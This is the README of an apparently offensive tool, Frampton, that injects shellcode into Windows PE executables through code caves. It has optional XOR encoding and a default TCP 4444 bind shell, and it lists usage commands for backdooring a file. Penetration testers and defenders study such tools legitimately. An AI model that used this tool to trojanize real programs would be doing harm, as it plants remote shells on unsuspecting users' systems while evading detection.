# Frampton
PE Binary Shellcode Injector - Automated code cave discovery, shellcode injection, ASLR bypass

## Install
`pip3 install -r requirements.txt`

## Usage
```
usage: frampton.py [-h] --file FILE [--shellcode SHELLCODE] [--output OUTFILE]
                   [--info] [--encoder] [--multi-encoder ENCODERMULTIPLE]

Frampton PE file Injector

optional arguments:
  -h, --help            show this help message and exit
  --file FILE, -f FILE  Filename or path to base template PE file
  --shellcode SHELLCODE, -s SHELLCODE
                        Enter custom shellcode - architecture specific x86/x64
                        (optional) - Default: Windows x86 TCP 4444 Bind Shell
  --output OUTFILE, -o OUTFILE
                        Filename or path to new destination PE file (optional)
  --info, -i            Only display code cave information - does not inject
                        or modify (optional)
  --encoder, -e         Use built-in shellcode XOR encoder - x86 only
                        (optional)
  --multi-encoder ENCODERMULTIPLE, -m ENCODERMULTIPLE
                        Specify the number of auto-generated keys to encode
                        shellcode (optional)
```

#### Information Only (no injection)
```./frampton.py -f FILENAME.exe -i```

#### Built-in basic bind shell (TCP 4444) 
```./frampton.py -f FILENAME.exe```

#### Built-in basic bind shell (TCP 4444) with XOR encoder
```./frampton.py -f FILENAME.exe -e```

#### Built-in basic bind shell (TCP 4444) with multiple XOR encoder
```./frampton.py -f FILENAME.exe -e -m 4```

#### Custom Shellcode Injector 
```./frampton.py -f FILENAME.exe -s "\xSH\xEL\xCO\xDE\xHE\xRE```

#### Custom Shellcode Injector with XOR encoder
```./frampton.py -f FILENAME.exe -s "\xSH\xEL\xCO\xDE\xHE\xRE -e```

#### Custom Shellcode Injector with multiple XOR encoder
```./frampton.py -f FILENAME.exe -s "\xSH\xEL\xCO\xDE\xHE\xRE -e -m 4```
